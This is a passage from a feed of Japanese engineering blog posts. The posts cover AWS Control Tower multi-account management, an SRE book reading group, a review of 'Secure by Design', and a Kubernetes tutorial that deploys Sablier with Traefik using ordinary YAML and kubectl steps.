Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"Site Reliability Engineering","contentSnippet":"これは 3-shake Advent Calendar 2022 9日目の蝉です。ポエムです。組織の Advent Calendar ですが、組織としての意見ではありません。早く SRE って3…","link":"https://qiita.com/yteraoka/items/561276f67ad4571ff9f3","isoDate":"2022-12-09T09:28:06.000Z","dateMiliSeconds":1670578086000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"SREの専門家が集まったチームで『SREの探求』の社内輪読会をやっているという話","contentSnippet":"これは SREのカレンダー | Advent Calendar 2022 - Qiita 9日目のエントリです。昨日はryosukes さんによる「北欧、暮らしの道具店」インフラ構成の変遷、5年間の課題と取り組み でした。はじめにこんにちは。株式会社スリーシェイク Sreake 事業部に所属している@nwiizo です。Sreake事業部は技術力が求められる領域で豊富な経験を持つSREの専門家が集まったチームです。事業部にはさまざまな背景を持つSREの専門家が多く在籍してます。しかし、そのSREの専門家達とは案件が一緒にならなかったり、能動的に質問をしなければSREに関する意見や知見を聞けませんでした。SREの探求 ―様々な企業におけるサイトリライアビリティエンジニアリングの導入と実践オライリージャパンAmazonそんな、課題がある中で半年前に各案件で得た知見や経験を各メンバーで出し合える会がもっと(社内で技術共有会はあるため)あると良いと思いました。そこで社内チャットで運営を募り 『輪読会について考える会』を行いました。社内チャットで運営を募ると一瞬で集まったので良い組織だと思いました。※『輪読会について考える会』の議事録のTOPページです。『SREの探求』輪読会この輪読会を開催するにあたって以下の3つを目的として上げました。各メンバーがSREに関する意見や知見を交換できる場にするチーム全体としてSREへの理解を深めることでSreake の価値を高めるさまざまなフェーズの意見が交換できるように『SREの探求』を読む候補としてSRE サイトリライアビリティエンジニアリング ―Googleの信頼性を支えるエンジニアリングチームやサイトリライアビリティワークブック ―SREの実践方法 も上がりました。しかし、Google だけではなく様々な企業におけるサイトリライアビリティエンジニアリングの導入と実践が紹介されているということで『SREの探求』に決定いたしました。輪読会の形式リモートで毎週水曜日 18:00から1時間、業務もあるので参加は自由としました。進め方としては担当者がNotion に担当の章をまとめて内容を発表する。その後、話し合いながらNotion やSlack に意見を垂れ流す方式にしました。参加者はSREの専門家達、リーダー、人事、営業、総務など様々な方がいてわいわいとやれているので僕は楽しい。輪読会をはじめてから半年が経過して開催できてない週もありましたが現在は14回の実施ができました。各担当者毎に特色がある発表で聞いていて面白いです。『SREの探求』には様々な視点でのSREでの話がされているので当初の目的としては正解です。また、同じ本で同じ職種なのにここまで読み方に差が出るのかと感心してます。人によってはすごくその事柄について考えられていて自分と比較して落ち込みます。でも、経験や考え方の違う人の話を聞けるのはとても参考と刺激になってます。『SREの探求』の輪読会のTOPページです。情報がシュッとまとまってます。また、1年が経過したタイミングで「輪読会に参加して、その後、SREに対しての考え方や行動に変化はありましたか？ 」という質問をしたいと考えております。もし、読んでる社内の方がいたら考えておいてください。さいごに『SREの探求』の輪読会を半年運営してきて各メンバーがSREやインフラ技術に関する意見や知見を交換できる場として機能し始めていると思ってます。自分自身もSREに関する知見を深める機会になっております。今後より良いサービスを提供していくためにも輪読会は続けていきたいなと思いました。輪読会をやる時には運営が複数人で実施することと目的を明確にしておけば運営を続けやすいなって思いました。『SREの探求』の輪読会を終了したタイミングでちゃんと効果測定したブログを書こうと【今は】思ってます。","link":"https://syu-m-5151.hatenablog.com/entry/2022/12/09/041252","isoDate":"2022-12-08T19:12:52.000Z","dateMiliSeconds":1670526772000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"速習 Datadog APM","contentSnippet":"Datadog APM を使った監視設計をすることがあり、使い勝手が良かったため基本的な部分と設定した方がいいなと思っている事項を書いていきます。 プロファイリング機能は使いませんでしたので、本記事では対象外です。 AP […]The post 速習 Datadog APM first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/datadog-apm/","isoDate":"2022-12-08T04:33:11.000Z","dateMiliSeconds":1670473991000,"authorName":"Sreake","authorId":"Sreake"},{"title":"インシデント対応しながら書くポストモーテム","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"lego で既存の秘密鍵を使って証明書を発行する","contentSnippet":"既存の秘密鍵を使って証明書を発行しなければいけないという特殊な環境ですぐに証明書を発行したいということがありました。 lego を使っての証明書発行はとても簡単ですが、デ","link":"https://blog.1q77.com/2022/12/issue-the-certificate-using-existing-private-key-with-lego/","isoDate":"2022-12-07T13:42:05.000Z","dateMiliSeconds":1670420525000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"『セキュア・バイ・デザインの鳴くところ』というタイトルでOWASP Fukuoka Meeting #9 に登壇しました。 #owaspfukuoka","contentSnippet":"OWASP Fukuoka Meeting #9 に登壇してきました！登壇してきました。自分はセキュリティ専門家ではないのですが発表するとセキュリティ専門家からレビューをもらえたり意見をいただけるのでそれがとてもよいです。ちなみに発表時間が諸事情により30分から1時間になって想定外の資料の取捨選択を行った...発表時間が30分から1時間になって想定してない肉付けしたら資料の主張が曲がったので改変している。— nwiizo (@nwiizo) 2022年12月6日  発表資料セキュア・バイ・デザインの鳴くところ - 安全なソフトウェアを全体から考えるみるで候の資料はこちらです『セキュア・バイ・デザインの鳴くところ』みたいな資料を作成したので公開しておきます！https://t.co/BduVhWd73K#owaspfukuoka— nwiizo (@nwiizo) 2022年12月7日  リモート発表は寂しいので相槌を入れてほしいと思っている。主催の@TakaharuOgasa さんや@mrtc0 さんが程よく補足情報を入れたりしてくれてよかった。セキュア・バイ・デザイン 安全なソフトウェア設計作者:Dan Bergh Johnsson,Daniel Deogun,Daniel Sawanoマイナビ出版Amazon参考資料OWASP SAMM(Software Assurance Maturity Model)OWASP SAMM(Software Assurance Maturity Model):githubOWT2017JP - OWASP\xa0SAMMセキュリティーチェックシートという闇への防衛術CircuitBreakerPattern: Circuit BreakerGitHub - istio/istio: Connect, secure, control, and observe services.Istio By Exampleサービスメッシュの「Istio」や、OSSで構成されたマネージドサービス――ミッションクリティカルなシステムをKubernetesで実現するカギはツールにあり！【デブサミ2018】Design It! ―プログラマーのためのアーキテクティング入門Release It!: Design and Deploy Production-Ready SoftwareOWASP SAMM Toolkit v2.0.6開発環境のセキュリティおよびCI/CDパイプラインのセキュア化PHPerKaigi 2022: 予防に勝る防御なし - 堅牢なコードを導く様々… / 和田卓人SOLID CODE 高品質なコードを生み出す実践的開発手法","link":"https://syu-m-5151.hatenablog.com/entry/2022/12/07/204400","isoDate":"2022-12-07T11:44:00.000Z","dateMiliSeconds":1670413440000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"CircleCI で OIDC を使用して AWS 認証を行う","contentSnippet":"CircleCI Advent Calendar 2022 の 7 日目です。https://qiita.com/advent-calendar/2022/circleci 概要CircleCI では OpenID Connect (OIDC) がサポートされています。OIDC を使用することで長期間有効なアクセスキーなどを用意することなく AWS 認証を行うことが可能です。詳細については下記ページをご参照ください。https://circleci.com/docs/ja/openid-connect-tokens/https://circleci.com/ja/blog...","link":"https://zenn.dev/kou_pg_0131/articles/circleci-oidc-aws","isoDate":"2022-12-07T09:15:08.000Z","dateMiliSeconds":1670404508000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリ…","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","link":"https://zenn.dev/toshikish/articles/70424038397d6d","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Cloud Runで定期ジョブを実行する","contentSnippet":"本記事は GCP(Google Cloud Platform) Advent Calendar 2022 の4日目のものです。3日目は @po3rin さんのAPI on GKE に高速で認証をつけるIdentity-Aware Proxy \xd7 Identity Platform でした。 概要普段、GCPを使ったWebアプリケーション開発をしていますが、その中で、定期的に(スケジューリングをして)、ジョブを実行するということがあります。例えば、DBのデータの整合性とか、ログの収集とか。。。この要件のときは、GCP内で完結させるとして、Cloud SchedulerのHTTP...","link":"https://zenn.dev/satohjohn/articles/20ebf8d1bed1d1","isoDate":"2022-12-04T13:48:19.000Z","dateMiliSeconds":1670161699000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Grafana OnCall で Twilio を使って電話を受ける","contentSnippet":"Twilio Advent Calendar 4日目の記事です。今年 (2022年) の6月に「Introducing Grafana OnCall OSS, on-call management…","link":"https://qiita.com/yteraoka/items/7e6db7111a061f5e22e4","isoDate":"2022-12-03T16:34:52.000Z","dateMiliSeconds":1670085292000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"「セキュア・バイ・デザイン」を読んで自分が何番目の豚かを考える。","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022  2日目の記事です。前日は@koki_develop さんによるStep CI で手軽に API をテストする でした。Step CI は API をテストするためのシンプルなオープンソースのコマンドラインツールです。「第8章: セキュリティを意識したデリバリ・パイプライン」ではStep CI のようなツールを用いてデリバリ・パイプラインで正常値、境界値、異常値、極端値を検査することが推奨されています。qiita.comこのエントリーで言いたいことセキュア・バイ・デザイン という書籍の多様さセキュリティにおける設計の大切さ現代におけるセキュリティの幅広さと難しさが凝縮された一冊であるということセキュリティを面で捉える難しさと重要性このエントリーを書き始めた理由2022年12月7日20:00- よりOWASP Fukuoka Meeting #9で「セキュア・バイ・デザインの鳴くところ」というタイトルで登壇してきます。この発表ではセキュア・バイ・デザイン、シフトレフト、DevSecOps は何すればいいんだよ！ という人に対してOWASP SAMM version 2を軸にガバナンス・設計・実装・検証・運用でのロードマップを明確にして設計・実装に関してもいくつかのTipsに言及していこうと思います。このイベントはYouTubeなどで後から動画を公開しないので動いてる私が見たい場合には参加登録してほしいです。発表の動画は公開されないですが資料は公開する予定です。それに対する予稿的な意味合いで書き始めました。内容は違うのに...。目次このエントリーで言いたいことこのエントリーを書き始めた理由目次はじめに「セキュア・バイ・デザイン 安全なソフトウェア設計」の目次僕たち二番目の子豚良い設計と悪い設計の違いSREは8章から10章が必読3部から読んでも良いと思ったさいごに参考はじめに「セキュア・バイ・デザイン 安全なソフトウェア設計」はOWASP TOP 10のような既知の脅威をリスト化して問題のある実装に対する解法を実装に組み込むためのTips を紹介する書籍ではありません。開発中にセキュリティについて意識する必要はないというような主張をする書籍でもありません。また、ドメイン駆動設計(Domain-Driven Design: DDD)を用いて、設計する書籍なのでDDDで開発しないから関係ないというわけではないです。システムの設計時にセキュリティだけを切り出して別問題として考えるのではなく、システム全体の関心事として扱い、設計時に考慮するというような書籍です。セキュア・バイ・デザイン: 安全なソフトウェア設計 Compass Booksシリーズ作者:Dan Bergh Johnsson,Daniel Deogun,Daniel Sawanoマイナビ出版Amazon「セキュア・バイ・デザイン 安全なソフトウェア設計」の目次セキュア・バイ・デザインについて実例と共に見ていく導入編。ソフトウェアの作成におけるセキュア・バイ・デザインの基盤を構築する設計の原則、考え、コンセプトについて学ぶ基礎編。レガシー・コードの改善、モノリシック・アーキテクチャでよく起こる問題、マイクロサービス・アーキテクチャについて学ぶ応用編の3部構成になっています。第1部: 導入編第1章: なぜ、設計がセキュリティにおいて重要なのか？第2章: ちょっと休憩: 『ハムレット』の悲劇第2部: 基礎編第3章: ドメイン駆動設計の中核を成すコンセプト第4章: 安全性を確立する実装テクニック第5章: ドメイン・プリミティブ（domain primitive）第6章: 状態の完全性（integrity）の保証第7章: 状態の複雑さの軽減第8章: セキュリティを意識したデリバリ・パイプライン第9章: 安全性を考えた処理失敗時の対策第10章: クラウド的考え方によるメリット第11章: ちょっと休憩: 保険料の支払いなしに成立してしまった保険契約第3部: 応用編第12章: レガシー・コードへの適用第13章: マイクロサービスでの指針第14章: 最後に：セキュリティを忘れるべからず！僕たち二番目の子豚家を作る時には壊れにくく、泥棒に盗まれにくい家を考えるのは当たり前です。家のセキュリティにコストをかける必要性は有名なの子豚が教えてくれたとおもいます。開発者はビジネス・ロジックを実装に落とし込みながらセキュリティの脆弱性についても考えなくてはならない。しかし、実装の優先するあまり一番目の子豚のような実装を行ってしまいます。そんな人たちを笑う二番目の子豚もいます。実装を行う開発者は常にセキュリティに関するスペシャリストというわけではないです。それを求めることも現実的ではありません。そのため、WAFを入れたり、脆弱性診断を行ったりします。しかし、それらも絶対ではありません。特に二章の\\"ちょっと休憩: 『ハムレット』の悲劇\\"で紹介された。ECサイトで「-1個」購入できるようになってしまうようなインシデントに関する話に関してはWAFがちゃんと設定されてないと無力だったりもする。ちなみに全体を通してセキュリティを意識しないことが大事だというが最終章の14章では全く逆のセキュリティを意識する重要性について説明されている。良い設計と悪い設計の違い全員にレベルの高いセキュアコーディングを要求するのではなく設計に意識を向けることで、従来のアプローチで抱えていたいくつかの問題に関して解決することを目的にしております。特に3-7章に関してはドメイン駆動設計を行う時にこれを意識しない場合にはこういうような脆弱性に繋がるという例は豊富でかつ示唆に富んでいる。また、本書はドメイン駆動設計から言葉、概念を拝借してはいるが\\"正しい使い方を簡単に、誤った使い方を困難に\\"ということを設計で達成しようぜと終始言ってるだけな気もする。あくまで私の感想ですけど。SREは8章から10章が必読SREという単語を利用したがこの文章も例に洩れずポジショニングトーク的にSREという単語を利用しておりますので何も言わないでください。SREコンサルという仕事をしているとSREの意味的なゲシュタルト崩壊を起こしてしまいます。情報セキュリティの３大要素にも入るぐらいなのでセキュリティにおいて可用性は重要です。8章から10章は特に私のようにSRE的な仕事をしている人間からするとアイデアの宝庫です。特に大事だと思ったのは使用しているツールのデフォルトの振る舞いを知ることの重要性についてです。既存のシステムで利用している秘伝のタレを継ぎ足しているだけで詳しくなったような気持ちになる。危険。本当はもっと、フォーカスしたいのでここは別でブログ書きたい。ちなみにOWASP Fukuoka Meeting #9のイベントではこの辺が話の中心に添えられている。3部から読んでも良いと思った防御的プログラミングのように良識あるようなTipsの積み重ねで問題発生を事前に防ごうというコーディングスタイルがあります。3部はわりとそれに近い内容に関する言及でレガシーコードとマイクロサービスでの注意点や改善方法がまとめられている。レガシーコードに関しては私の大好きなリファクタリング(第2版): 既存のコードを安全に改善するという書籍がある。もう、1章を追加するならセキュリティの概念を足したようなこの章が追加されてほしいと思いました。マイクロサービスの章に関しては現在、私がソフトウェアアーキテクチャ・ハードパーツ ―分散アーキテクチャのためのトレードオフ分析という書籍を読んでいる。セキュリティ的な品質をソフトウェアの設計へ落とし込むには設計段階で考慮が必要。特に非機能的なので熟考に次ぐ次ぐだけ絶対にどうにかならず経験が必要な領域。最終章は具体的なコードレビューやアーキテクチャレビューにセキュリティの専門家が必要な重要性、脆弱性診断やインシデントハンドリングなどのセキュリティをがっつり意識した内容です。全てをひっくり返す感じがしてとても気持ちが良い。セキュリティの専門家はこの章まで耐えて「気持ちぃいいいいい(実際にどうなるかは知らない)」を経験してほしいです。さいごにあまねく全ての開発者に対してセキュリティの専門家と同等の知識が求められセキュリティに関する知識を常にアップデートしなければならないというこの時代。結局、安全な設計にもセキュリティにもお金が必要になる。地獄の沙汰も金次第。ちゃんと、コストを支払える会社に入社を果たし三番目の豚として幸せな生活をおくれるように祈ってます。本書は本当に良い本なのでこのエントリーで気になった人はぜひ、「セキュア・バイ・デザイン 安全なソフトウェア設計」を購入して熟読して実践してほしいです。明日は我らが長ATSによる「SRE事業をしているので「信頼性」について考えたくなった」です。参考OWASP SAMM version 2セキュア・バイ・デザイン 安全なソフトウェア設計プログラマが知るべき97のこと コードは設計である予防に勝る防御なし - 堅牢なコードを導く様々な設計のヒント良い設計と悪い設計の違い","link":"https://syu-m-5151.hatenablog.com/entry/2022/12/01/225019","isoDate":"2022-12-01T13:50:19.000Z","dateMiliSeconds":1669902619000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Step CI で手軽に API をテストする","contentSnippet":"3-shake Advent Calendar 2022 の 1 日目です。株式会社スリーシェイクのメンバーが各々自由に技術・非技術ネタを投稿していきます。https://qiita.com/advent-calendar/2022/3-shake1 日目のこの記事では、 Step CI という API テストツールが最高だったので紹介します。 概要Step CI は API をテストするためのシンプルなオープンソースのコマンドラインツールです。REST はもちろん、 GraphQL や gRPC などその他様々な種類の API に対応しています。stepci CLI を...","link":"https://zenn.dev/kou_pg_0131/articles/stepci-introduction","isoDate":"2022-12-01T09:00:00.000Z","dateMiliSeconds":1669885200000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Kubernetes 上でsablier を用いてZero Scale を実現する 前編","contentSnippet":"前回のエントリーsyu-m-5151.hatenablog.comはじめにやはり、人は強欲らしいのでコンテナを使っているのに必要な時必要な分だけのリソースを起動させてほしいという願いを常に持っている。Kubernetes の場合はKnativeなどを利用すれば達成できる。sablierはリバースプロキシを利用してアクセスがない時は自動的にシャットダウンしてアクセスがあれば指定のコンテナを起動することができるツールです。前回はdocker 上での動作確認を行った。引き続き今回はKubernetes 環境でのsablierの検証を行いました。今回はsablierやTraefik 、各種ミドルウェアの設定ファイルに関しては言及してません。気合があれば後編として書いていきます。sablier/hourglass.png at main \xb7 acouvreur/sablier \xb7 GitHub より前回のエントリーはじめにやってみるk3s を用いて Kubernetes Cluster を作成するHelmを用いたTraefikの作成Sablier を作成していくアプリケーション本体のデプロイSablier PluginによるTraefik経由でのIngressの設定を行うさいごに作業リポジトリやってみる公式サイトにはサンプルコード「Sablier Guide: Code-Server + Traefik + Kubernetes Ingress」としてKubernetes 上で Cloud Native なアプリケーションプロキシーのTraefikとKubernetes Ingressを用いたものが紹介されている。k3s を用いて Kubernetes Cluster を作成する以下の内容をdocker-compose.ymlというファイルにコピーして、docker compose up -dを実行します。version: \'3\'services:  server:    image: \\"rancher/k3s:v1.24.8-k3s1\\"    command: server --no-deploy traefik    tmpfs:      - /run      - /var/run    ulimits:      nproc: 65535      nofile:        soft: 65535        hard: 65535    privileged: true    restart: always    environment:      - K3S_KUBECONFIG_OUTPUT=/output/kubeconfig.yaml      - K3S_KUBECONFIG_MODE=666    volumes:      # This is just so that we get the kubeconfig file out      - .:/output    ports:      - 6443:6443  # Kubernetes API Server      - 8080:80  # Ingress controller port 80docker compose up -dを実行します。$ docker compose up -d[+] Running 3/3 ⠿ server Pulled   ⠿ 73c47571f4bd Pull complete   ⠿ 210e8c1c5e29 Pull complete[+] Running 2/2 ⠿ Network sablier-code-server-traefik-kubernetes_default     Created ⠿ Container sablier-code-server-traefik-kubernetes-server-1  Startedset -x KUBECONFIG ./kubeconfig.yaml:/Users/nwiizo/.kube/config のような設定が環境変数として入っているのでカレントディレクトリにあるkubeconfig.yaml がKUBECONFIGとして優先的に実行される。そこでkubectl get node を実行するとCluster が準備できていることが分かる。$ kubectl get nodeNAME           STATUS     ROLES                  AGE     VERSION58160ffa6e9b   Ready      control-plane,master   3m56s   v1.24.8+k3s1Helmを用いたTraefikの作成helm のインストールに関しては各自「helm install」とかで調べてほしい。とりあえず、traefikのHelmリポジトリを追加します。$ helm repo add traefik https://helm.traefik.io/traefik$ helm repo updatehelm でデプロイするリソースは事前に確認しておいたほうがよいので確認しておきます。$ helm show all traefik/traefikデプロイをするのですが既存のHelm templateに自分が利用したい値を渡してデプロイします。templateに値を渡す方法は主に二つあります。values.yamlを利用者が用意するchartの利用者が helm install コマンド時に値を渡す(values.yamlの上書き可能)今回はvalues.yaml を以下のように作成してデプロイを行うimage:  tag: \\"2.9.1\\"experimental:  plugins:    enabled: trueadditionalArguments:  - \\"--experimental.plugins.sablier.moduleName=github.com/acouvreur/sablier\\"  - \\"--experimental.plugins.sablier.version=v1.1.1\\"providers:  kubernetesIngress:    enabled: true    allowEmptyServices: truetraefikチャートをvalues.yamlファイルとともにインストールします。また、kube-system というシステムコンポーネントやアドオンとして位置づけられているものをデプロイするためのNamespaceを用います。$ helm install traefik traefik/traefik -f values.yaml --namespace kube-systemNAME: traefikLAST DEPLOYED: Wed Nov 30 07:58:21 2022NAMESPACE: kube-systemSTATUS: deployedREVISION: 1TEST SUITE: NoneNOTES:Traefik Proxy v2.9.5 has been deployed successfullyon kube-system namespace !Sablier を作成していく再三の説明になるのですがsablier はアプリケーションをシャットダウンさせたりしているアプリです。それ故に強い権限が必要になります。そのため、Sablier 用のサービスアカウント作成して、 Sablier のデプロイを行います。sablier-sa.yaml というファイルで権限周りを一つにした。---apiVersion: v1kind: ServiceAccountmetadata:  name: sablier  namespace: kube-system---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRolemetadata:  name: sablier  namespace: kube-systemrules:  - apiGroups:      - apps      - \\"\\"    resources:      - deployments      - deployments/scale      - statefulsets      - statefulsets/scale    verbs:      - patch   # Scale up and down      - get     # Retrieve info about specific deployment or statefulset      - update  # Scale up and down      - list    # Events      - watch   # Events---apiVersion: rbac.authorization.k8s.io/v1kind: ClusterRoleBindingmetadata:  name: sablier  namespace: kube-systemroleRef:  apiGroup: rbac.authorization.k8s.io  kind: ClusterRole  name: sabliersubjects:  - kind: ServiceAccount    name: sablier    namespace: kube-systemこちらをデプロイ$ kubectl apply -f sablier-sa.yaml serviceaccount/sablier createdclusterrole.rbac.authorization.k8s.io/sablier createdclusterrolebinding.rbac.authorization.k8s.io/sablier createdsablier-deploy.yaml というファイルでリソース周りを一つにした。apiVersion: apps/v1kind: Deploymentmetadata:  name: sablier-deployment  namespace: kube-system  labels:    app: sablierspec:  replicas: 1  selector:    matchLabels:      app: sablier  template:    metadata:      labels:        app: sablier    spec:      serviceAccountName: sablier      serviceAccount: sablier      containers:      - name: sablier        image: acouvreur/sablier:1.1.1        args:        - \\"start\\"        - \\"--provider.name=kubernetes\\"        ports:        - containerPort: 10000---apiVersion: v1kind: Servicemetadata:  name: sablier  namespace: kube-systemspec:  selector:    app: sablier  ports:    - protocol: TCP      port: 10000      targetPort: 10000こちらもデプロイ$ kubectl apply -f sablier-deploy.yaml deployment.apps/sablier-deployment createdservice/sablier createdきちんとデプロイされているか確認する。また、kubectl -n kube-system logs -l=app=sablier でログを確認するのも良いと思う$ kubectl -n kube-system get deployments -l=app=sablierNAME                 READY   UP-TO-DATE   AVAILABLE   AGEsablier-deployment   1/1     1            1           6m9sアプリケーション本体のデプロイapp-deployment.yaml でアプリケーションのリソースをデプロイします。apiVersion: apps/v1kind: Deploymentmetadata:  name: code-server-deployment  namespace: default  labels:    app: code-serverspec:  replicas: 1  selector:    matchLabels:      app: code-server  template:    metadata:      labels:        app: code-server    spec:      containers:      - name: code-server        image: codercom/code-server:4.8.3        ports:        - containerPort: 8080---apiVersion: v1kind: Servicemetadata:  name: code-server-service  namespace: defaultspec:  selector:    app: code-server  ports:    - protocol: TCP      port: 8080      targetPort: 8080kubectl にk というalias を貼っている。手癖でこうなったのでブログでも記載しておく。リソースの確認をk get pod したらさっさと次に行く$ k apply -f app-deployment.yaml deployment.apps/code-server-deployment createdservice/code-server-service createdSablier PluginによるTraefik経由でのIngressの設定を行うapp-ingress.yaml でデプロイするapiVersion: networking.k8s.io/v1kind: Ingressmetadata:  name: code-server-ingress  namespace: default  annotations:    kubernetes.io/ingress.class: traefikspec:  rules:  - host: localhost    http:      paths:      - path: /        pathType: Prefix        backend:          service:            name: code-server-service            port:              number: 8080http://localhost:8080 にアクセスできたと思います。その後、アプリケーションのレプリカセットを0にします。がこれは削除ではないです。$ k scale deployment code-server-deployment --replicas=0deployment.apps/code-server-deployment scaled# 削除されたわけではないので確認できる$  k get deployments/code-server-deployment NAME                     READY   UP-TO-DATE   AVAILABLE   AGEcode-server-deployment   0/0     0            0           12mapp-sablier-middleware.yaml をデプロイする。sessionDuration: 2m 